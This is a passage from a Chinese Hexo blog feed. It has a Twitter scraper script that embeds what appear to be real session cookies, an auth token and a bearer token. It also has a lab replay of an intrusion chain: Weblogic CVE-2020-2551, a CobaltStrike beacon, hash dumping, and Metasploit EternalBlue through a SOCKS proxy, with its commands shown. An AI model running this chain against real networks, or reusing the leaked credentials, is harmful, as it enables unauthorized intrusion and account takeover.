src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201238.jpg" alt="IMG_20220310_201238"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201243.jpg" alt="IMG_20220310_201243"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201247.jpg" alt="IMG_20220310_201247"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201252.jpg" alt="IMG_20220310_201252"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201256.jpg" alt="IMG_20220310_201256"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5CIMG_20220310_201314.jpg" alt="IMG_20220310_201314"></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>制作twitter爬虫</title>
    <link href="/%E5%88%B6%E4%BD%9Ctwitter%E7%88%AC%E8%99%AB.html"/>
    <url>/%E5%88%B6%E4%BD%9Ctwitter%E7%88%AC%E8%99%AB.html</url>
    
    <content type="html"><![CDATA[<h1 id="方法一：自己创建APP"><a href="#方法一：自己创建APP" class="headerlink" title="方法一：自己创建APP"></a>方法一：自己创建APP</h1><h2 id="1-创建APP"><a href="#1-创建APP" class="headerlink" title="1. 创建APP"></a>1. 创建APP</h2><p>进入<a href="https://apps.twitter.com/%EF%BC%8C%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84app%E3%80%82%E5%8F%AA%E6%9C%89%E6%9C%89%E4%BA%86app%E6%89%8D%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AEtwitter%E7%9A%84api%E5%B9%B6%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E3%80%82%E5%8F%AA%E9%9C%80%E5%88%9B%E5%BB%BA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84app%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%90%84%E7%A7%8D%E4%BF%A1%E6%81%AF%E9%9A%8F%E6%84%8F%E5%A1%AB%E5%86%99%EF%BC%8C%E5%B9%B6%E4%B8%8D%E9%9C%80%E8%A6%81%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E8%AE%A4%E8%AF%81%EF%BC%8C%E6%88%91%E4%BB%AC%E8%A6%81%E7%9A%84%E5%8F%AA%E6%98%AFapp%E7%9A%84Consumer">https://apps.twitter.com/，创建自己的app。只有有了app才可以访问twitter的api并抓取数据。只需创建最简单的app即可，各种信息随意填写，并不需要进一步的认证，我们要的只是app的Consumer</a> Key (API Key)， Consumer Secret (API Secret)， Access Token 和 Access Token Secret。鉴于单app的爬取次数限制，可以申请很多app来提高总次数。</p><h2 id="2-确定要使用的API"><a href="#2-确定要使用的API" class="headerlink" title="2. 确定要使用的API"></a>2. 确定要使用的API</h2><p>twitter提供多种类型的api，其中常用的有REST API和Streaming API。前者是常见的api类型，后者则可以跟踪监视一个用户或者一个话题。</p><p>REST API下面有很多的api，有价值爬取的有以下几个：</p><p>GET statuses&#x2F;user_timeline：返回一个用户发的推文。注意twitter里回复也相当于发推文。<br>GET friends&#x2F;ids：返回一个用户的followees。<br>GET followers&#x2F;ids：返回一个用户的followers。<br>GET users&#x2F;show：返回一个用户的信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- codeing =utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2020/10/21 16:43</span><br><span class="hljs-comment"># @Author:yuchuan</span><br><span class="hljs-comment"># @File : crawl_tweets_by_id.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span>  chain<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> calendar<br><span class="hljs-comment">#getuserID可通过user screenname获取ID，不用人工去获取</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>        <span class="hljs-comment">#包装header，伪装成浏览器。</span><br><span class="hljs-comment">#*******************为需要替换部分</span><br>        headers = &#123;<br>            <span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-string">&#x27;guest_id=v1:164775775099786971; d_prefs=MToxLGNvbnNlbnRfdmVyc2lvbjoyLHRleHRfdmVyc2lvbjoxMDAw; guest_id_ads=v1:164775775099786971; guest_id_marketing=v1:164775775099786971; personalization_id=&quot;v1_Gxv55pYehjUUIqIzDWKURw==&quot;; _ga=GA1.2.1337685308.1647757781; _gid=GA1.2.1172757769.1647757781; kdt=p7UZYMTikXsQrnReETEWpS60OvEm9FE2jnoM1XA4; auth_token=46c7ede4ccb9ecf77a4d15b07884d903293215d0; ct0=3377c7c5232fe924d9e29fcec79a9f94353ebb29dd5504b7dbd9cddff6d3402fd19a48de16bd04fd830a5fdbff90420a9d37f27f768cbda3a081b4eff5f729448435b85fc608d4abd083dcc7d3de3809; twid=u=1499860202291531782; att=1-tG82KoUAicixFemkiupEht8SE0BroiRsYUYySREd; des_opt_in=Y; external_referer=padhuUp37zixoA2Yz6IlsoQTSjz5FgRcKMoWWYN3PEQ=|0|8e8t2xd8A2w=&#x27;</span>,<br>            <span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;x-csrf-token&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;authorization&quot;</span>: <span class="hljs-string">&quot;Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs=1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA&quot;</span>,<br>        &#125;<br>        <span class="hljs-comment">#也可直接获取id 爬取</span><br>        username = pd.read_csv(<span class="hljs-string">&#x27;*******************.csv&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(username[<span class="hljs-string">&#x27;username&#x27;</span>])):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(username[<span class="hljs-string">&#x27;username&#x27;</span>][i]))<br>            csv_username=<span class="hljs-built_in">str</span>(username[<span class="hljs-string">&#x27;username&#x27;</span>][i])<br>            userID=getuserID(csv_username,headers)<br>            twitterURL = <span class="hljs-string">&quot;https://twitter.com/i/api/2/timeline/profile/&quot;</span> + userID + <span class="hljs-string">&quot;.json?include_profile_interstitial_type=1&amp;include_blocking=1&amp;include_blocked_by=1&amp;include_followed_by=1&amp;include_want_retweets=1&amp;include_mute_edge=1&amp;include_can_dm=1&amp;include_can_media_tag=1&amp;skip_status=1&amp;cards_platform=Web-12&amp;include_cards=1&amp;include_ext_alt_text=true&amp;include_quote_count=true&amp;include_reply_count=1&amp;tweet_mode=extended&amp;include_entities=true&amp;include_user_entities=true&amp;include_ext_media_color=true&amp;include_ext_media_availability=true&amp;send_error_codes=true&amp;simple_quoted_tweet=true&amp;include_tweet_replies=false&amp;count=20&amp;userId=&quot;</span> + userID + <span class="hljs-string">&quot;&amp;ext=mediaStats%2ChighlightedLabel&quot;</span><br>            flag=<span class="hljs-literal">True</span><br>            content = []<br>            full_content=[]<br>            response = connect(headers, twitterURL)<br>            <span class="hljs-comment">#flag 相当于确定获取到的内容是否在当日里。flag = false 停止爬取</span><br>            <span class="hljs-keyword">while</span> (flag):<br>                <span class="hljs-comment"># 建立连接</span><br>                response = connect(headers, twitterURL)<br>                <span class="hljs-comment"># formatRes修改源码的类型</span><br>                responseJson = formatRes(response.content)<br>                <span class="hljs-comment"># 爬取每个json中 所有推文以及时间，转推，点赞等</span><br>                content = parsetweets(responseJson)<br>                <span class="hljs-comment"># 将每个json中的内容添加到一个列表中</span><br>                full_content.extend(content)<br>                <span class="hljs-comment">#获取下一页推文的json包</span><br>                twitterURL = getNewURL(responseJson,userID)<br>                flag=CtrlFlag(content)<br>                <span class="hljs-comment"># n = n - 1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------------------------------------------------------------------------------------------------\n------------------------------------------------------------------------------------------------&quot;</span>)<br>            <span class="hljs-comment"># 提取只要当天的推文</span><br>            everydaytweet=todaytweet(full_content)<br>            <span class="hljs-comment"># 将内容保存到CSV中，每个用户一个CSV</span><br>            saveData(everydaytweet, csv_username)<br>            time.sleep(<span class="hljs-number">30</span>)<br><br><span class="hljs-comment">#     获取当天的推文：本来想法：直接在CSV中进行排序，然后截取当天推文。时间排序没成功：：：：：直接在列表中截取当天的推文，再保存在CSV文件中可以。</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CtrlFlag</span>(<span class="hljs-params">content</span>):<br>    flag=<span class="hljs-literal">True</span><br>    time = (todaytime() + timedelta(hours=-<span class="hljs-number">8</span>)).strftime(<span class="hljs-string">&quot;%Y-%m-%d&quot;</span>)<br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(content)):<br>        <span class="hljs-keyword">if</span> content[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">10</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(time):<br>            count=count+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> count==<span class="hljs-built_in">len</span>(content):<br>            flag=<span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getuserID</span>(<span class="hljs-params">username,headers</span>):<br>    connectURL = <span class="hljs-string">&quot;https://twitter.com/i/api/graphql/jMaTS-_Ea8vh9rpKggJbCQ/UserByScreenName?variables=%7B%22screen_name%22%3A%22&quot;</span> + username + <span class="hljs-string">&quot;%22%2C%22withHighlightedLabel%22%3Atrue%7D&quot;</span><br>    <span class="hljs-built_in">print</span>(connectURL)<br>    response=connect(headers,connectURL)<br>    responseJson= formatRes(response.content)<br>    <span class="hljs-comment"># print(responseJson)</span><br>    data=responseJson[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>]<br>    <span class="hljs-comment"># print(data)</span><br>    userID=find(<span class="hljs-string">&#x27;rest_id&#x27;</span>,data)<br>    <span class="hljs-keyword">return</span> userID<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">todaytweet</span>(<span class="hljs-params">full_content</span>):<br>    content=[]<br>    <span class="hljs-comment">#todaytime是香港时间，-8获得UTC时间，与爬取的created_at时间统一</span><br>    time=(todaytime()+ timedelta(hours=-<span class="hljs-number">8</span>)).strftime(<span class="hljs-string">&quot;%Y-%m-%d&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(full_content)):<br><br>        <span class="hljs-keyword">if</span> full_content[i][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>:<span class="hljs-number">10</span>] <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(time):<br>            content.append(full_content[i])<br>    <span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># 爬取推文，和时间等，对时间进行格式化****/**/**</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parsetweets</span>(<span class="hljs-params"><span class="hljs-built_in">dict</span></span>):<br>    <span class="hljs-built_in">dict</span> = <span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;globalObjects&#x27;</span>][<span class="hljs-string">&#x27;tweets&#x27;</span>]<br>    full_text=findAll(<span class="hljs-string">&#x27;full_text&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    created_at=findAll(<span class="hljs-string">&#x27;created_at&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    favorite_count=findAll(<span class="hljs-string">&#x27;favorite_count&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    quote_count=findAll(<span class="hljs-string">&#x27;quote_count&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    reply_count=findAll(<span class="hljs-string">&#x27;reply_count&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    retweet_count=findAll(<span class="hljs-string">&#x27;retweet_count&#x27;</span>,<span class="hljs-built_in">dict</span>)<br>    formatcreated_at=[]<br>    time1=[]<br>    time2=[]<br>    utc_time1=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(created_at)):<br>        <span class="hljs-comment">#从twitter爬下来的时候，就是UTC时间，统一为UTC时间，将本地时间（香港）-8小时。美国时间+5小时</span><br>        time1.append(datetime.strptime(created_at[i],<span class="hljs-string">&quot;%a %b %d %H:%M:%S +0000 %Y&quot;</span>))<br>        time2.append(datetime.strftime(time1[i],<span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>))   <span class="hljs-comment">#datatime转str</span><br>    tweetData = []<br>    <span class="hljs-comment">#tweetData = list(chain.from_iterable(zip( created_at,full_text)))  # 合并两个列表</span><br>    <span class="hljs-comment"># print(tweetData)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(full_text)):<br>        tweetData.append([time2[i],full_text[i],favorite_count[i],quote_count[i],reply_count[i],retweet_count[i]])<br>    <span class="hljs-keyword">return</span> tweetData<br><br><span class="hljs-comment"># 当前日期 20201029格式，此时时间type：datetime,调用可能需要转换成str</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">todaytime</span>():<br>    today=datetime.today()<br>    <span class="hljs-keyword">return</span> today<br><br><span class="hljs-comment">#保存到CSV中,每个人保存在一个CSV文件中、</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params">content,filename</span>):<br>    filetime = todaytime().strftime(<span class="hljs-string">&#x27;%y%y%m%d&#x27;</span>)<br>    filename=filetime+<span class="hljs-string">&quot; &quot;</span>+filename<br>    filepath = <span class="hljs-string">&#x27;D:/twitterdata/&#x27;</span>+filename+<span class="hljs-string">&#x27;.csv&#x27;</span><br>    name=[<span class="hljs-string">&#x27;Time&#x27;</span>, <span class="hljs-string">&#x27;Tweet&#x27;</span>,<span class="hljs-string">&#x27;Favorite&#x27;</span>,<span class="hljs-string">&#x27;Quote&#x27;</span>,<span class="hljs-string">&#x27;Reply&#x27;</span>,<span class="hljs-string">&#x27;Retweet&#x27;</span>]<br>    Data=pd.DataFrame(columns=name,data=content)<br>    Data.to_csv(filepath,encoding=<span class="hljs-string">&#x27;utf-8-sig&#x27;</span>)<br><br><span class="hljs-comment"># 直接查找键值 find</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">target, dictData, notFound=<span class="hljs-string">&#x27;没找到&#x27;</span></span>):<br>    queue = [dictData]<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(queue) &gt; <span class="hljs-number">0</span>:<br>        data = queue.pop()<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> data.items():<br>            <span class="hljs-keyword">if</span> key == target: <span class="hljs-keyword">return</span> value<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(value) == <span class="hljs-built_in">dict</span>: queue.append(value)<br>    <span class="hljs-keyword">return</span> notFound<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findAll</span>(<span class="hljs-params">target, dictData, notFound=[]</span>):<br>    <span class="hljs-comment">#print(dictData)</span><br>    result = []<br>    <span class="hljs-keyword">for</span> key, values <span class="hljs-keyword">in</span> dictData.items():<br>        content = values[target]<br>        result.append(content)<br>    <span class="hljs-comment">#print(result)</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 获取到cursor，并组成新的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getNewURL</span>(<span class="hljs-params">responseJson,userID</span>):<br>    responseJsonCursor1 = responseJson[<span class="hljs-string">&#x27;timeline&#x27;</span>][<span class="hljs-string">&#x27;instructions&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;addEntries&#x27;</span>][<span class="hljs-string">&#x27;entries&#x27;</span>][-<span class="hljs-number">1</span>]<span class="hljs-comment">#这是字典，是列表中的最后一个元素</span><br>    cursorASCII=find(<span class="hljs-string">&#x27;cursor&#x27;</span>,responseJsonCursor1)<br>    cursorASCII2 = find(<span class="hljs-string">&#x27;value&#x27;</span>, cursorASCII)<br>    cursor=urllib.parse.quote(cursorASCII2)<br>    newURL=<span class="hljs-string">&quot;https://twitter.com/i/api/2/timeline/profile/&quot;</span>+userID+<span class="hljs-string">&quot;.json?include_profile_interstitial_type=1&amp;include_blocking=1&amp;include_blocked_by=1&amp;include_followed_by=1&amp;include_want_retweets=1&amp;include_mute_edge=1&amp;include_can_dm=1&amp;include_can_media_tag=1&amp;skip_status=1&amp;cards_platform=Web-12&amp;include_cards=1&amp;include_ext_alt_text=true&amp;include_quote_count=true&amp;include_reply_count=1&amp;tweet_mode=extended&amp;include_entities=true&amp;include_user_entities=true&amp;include_ext_media_color=true&amp;include_ext_media_availability=true&amp;send_error_codes=true&amp;simple_quoted_tweet=true&amp;include_tweet_replies=false&amp;count=20&amp;cursor=&quot;</span>+cursor+<span class="hljs-string">&quot;&amp;userId=&quot;</span>+userID+<span class="hljs-string">&quot;&amp;ext=mediaStats%2ChighlightedLabel&quot;</span><br>    <span class="hljs-keyword">return</span> newURL<br><br><span class="hljs-comment">#格式化获取到的json//bytes转string loads()将string读入字典中</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">formatRes</span>(<span class="hljs-params">res</span>):<br>       strRes = <span class="hljs-built_in">str</span>(res, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>       dictRes = json.loads(strRes)<br>       <span class="hljs-keyword">return</span> dictRes<br><br><span class="hljs-comment">#设置代理proxies，链接获取网页数据。代理部分需要自己设置</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>(<span class="hljs-params">headers,twitterURL</span>):<br>       proxies = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:7890&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:7890&quot;</span>, &#125;<br>       response = requests.get(twitterURL,headers = headers, proxies=proxies)<br>       <span class="hljs-keyword">return</span> response<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:   <span class="hljs-comment">#当程序执行时</span><br>    main()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python 爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从外网 Weblogic 打进内网，再到约束委派接管域控205359</title>
    <link href="/%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7205359.html"/>
    <url>/%E4%BB%8E%E5%A4%96%E7%BD%91%20Weblogic%20%E6%89%93%E8%BF%9B%E5%86%85%E7%BD%91%EF%BC%8C%E5%86%8D%E5%88%B0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7205359.html</url>
    
    <content type="html"><![CDATA[<h1 id="从外网-Weblogic-打进内网，再到约束委派接管域控-复现"><a href="#从外网-Weblogic-打进内网，再到约束委派接管域控-复现" class="headerlink" title="从外网 Weblogic 打进内网，再到约束委派接管域控(复现)"></a>从外网 Weblogic 打进内网，再到约束委派接管域控(复现)</h1><p>靶场官方：渗透攻击红队（微信公众号）</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488950&idx=1&sn=48d93f1fac38eae99cc4e78474eb557c&chksm=c172cfaaf60546bc3f4bfee09181c0f3f07b0c8ba5e9d9a9a0ee92ffc734aff8fe94acb2967c&mpshare=1&scene=23&srcid=1108Dj1vgEkUTeAGMQSHtdZu&sharer_sharetime=1636354180149&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&amp;mid=2247488950&amp;idx=1&amp;sn=48d93f1fac38eae99cc4e78474eb557c&amp;chksm=c172cfaaf60546bc3f4bfee09181c0f3f07b0c8ba5e9d9a9a0ee92ffc734aff8fe94acb2967c&amp;mpshare=1&amp;scene=23&amp;srcid=1108Dj1vgEkUTeAGMQSHtdZu&amp;sharer_sharetime=1636354180149&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p><h2 id="0x01-靶场配置"><a href="#0x01-靶场配置" class="headerlink" title="0x01 靶场配置"></a>0x01 靶场配置</h2><p>攻击机1：win10  192.168.0.193</p><p>攻击机2：kali       192.168.0.105</p><p>靶机： 192.168.0.154  weblogic服务器，其他在域内</p><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><h3 id="xray扫一下weblogic-有CVE-2020-2551"><a href="#xray扫一下weblogic-有CVE-2020-2551" class="headerlink" title="xray扫一下weblogic    有CVE_2020_2551"></a>xray扫一下weblogic    有CVE_2020_2551</h3><p>直接一把梭，有admin账户且出网</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110180406788.png" alt="image-20211110180406788"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110174428216.png" alt="image-20211110174428216"></p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110174640624.png" alt="image-20211110174640624" style="zoom:200%;" /><p>query process查看当前进程</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110180816025.png" alt="image-20211110180816025"></p><p>可以看到是无AV的，都不需要做免杀</p><p>直接Powershell 上线到 CobaltStrike：</p><p>cs-attack-payload Generator -powshell command生成命令shell</p><p>放入利用工具里执行</p><p>好奇怪  我本机都可以上线，但是发现weblogic服务器就是上不了线，开http上传beacon.exe并运行也不能上线</p><p>后来发现ping不了我的kali（cs服务器)，原来设置到第一层网络去了</p><p>得把kali的桥接模式设成物理机</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110194820326.png" alt="image-20211110194820326"></p><p>ok 成功上线</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110195429152.png" alt="image-20211110195429152"></p><p>看到改机器有两个网卡</p><p>hashdump下来</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110195709019.png" alt="image-20211110195709019"></p><p>既然有第二个网卡，进行域内信息手机</p><p>凸(艹皿艹 )，扫半天没扫出来，才发现我pc靶机没打开（用巨龙拉冬9.0多口探测）</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110201549508.png" alt="image-20211110201549508"></p><p>扫到了这个</p><p>巨龙拉冬扫一下龙洞</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110202205165.png" alt="image-20211110202205165"></p><p>ms17-010</p><p>端口转发&gt;cs派生给msf</p><p>利用cs自带开个SOCKS端口<img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110202557195.png" alt="image-20211110202557195"></p><p>然后msf连接</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">setg Proxies socks<span class="hljs-number">4:192.168.0</span>.<span class="hljs-number">105:7000</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211110205943146.png" alt="image-20211110205943146"></p><p>attack</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msf6 &gt; setg ReverseAllowProxy <span class="hljs-literal">true</span><br><br>msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue<br><br>msf6 &gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><br>msf6 &gt; <span class="hljs-built_in">set</span> rhost 10.10.20.7<br><br>msf6 &gt; <span class="hljs-built_in">run</span><br><br><br></code></pre></td></tr></table></figure><p>打不进去，是因为cs自带的socks的不稳定性</p><p>直接用cs创建msf监听器试一下，然后msf打开监听即可</p><figure class="highlight 